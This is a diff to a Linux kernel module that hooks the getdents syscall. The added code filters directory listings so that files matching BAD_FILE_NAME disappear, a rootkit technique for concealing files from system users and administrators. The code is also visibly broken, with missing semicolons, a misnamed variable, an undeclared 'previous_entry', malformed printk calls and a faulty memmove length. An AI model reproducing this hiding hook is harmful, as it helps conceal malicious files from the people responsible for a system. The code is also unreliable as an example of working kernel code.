@@ -52,8 +52,31 @@ The fake get_dents syscall which we will use instead of the original one so we c
 */
 asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent *dir_pointer, unsigned int count)
 {
-    printk(KERN_INFO "testing");
-    return original_getdents(fd, dir_pointer, count);
+    long index = 0;
+    struct linux_dirent * current_entry = dir_pointer;
+    long returned_bytes = original_getdents(fd, dir_pointer, count);
+    if (returned_bytes <= 0)
+    {
+        printk(KERN_INFO, "dir is empty?");
+        return returned_bytes
+    }
+
+    while (index < returned_bytes)
+    {
+        printk(KERN_INFO, "got one: %s", current_entry->d_name);
+        if (0 == strncmp(current_entry->d_name, BAD_FILE_NAME, strlen(BAD_FILE_NAME)))
+        {
+            return_bytes -= current_entry->d_reclen;
+            memmove(current_entry, (char *)current_entry + current_entry->d_reclen, returned_bytes - index);
+        }
+        else
+        {
+            previous_entry = current_entry
+            index += current_entry->d_reclen;
+        }
+        current_entry = (struct linux_dirent *)((char *)dir_pointer + index);
+    }
+    return returned_bytes;
 }
 
 static int __init hook_init(void)
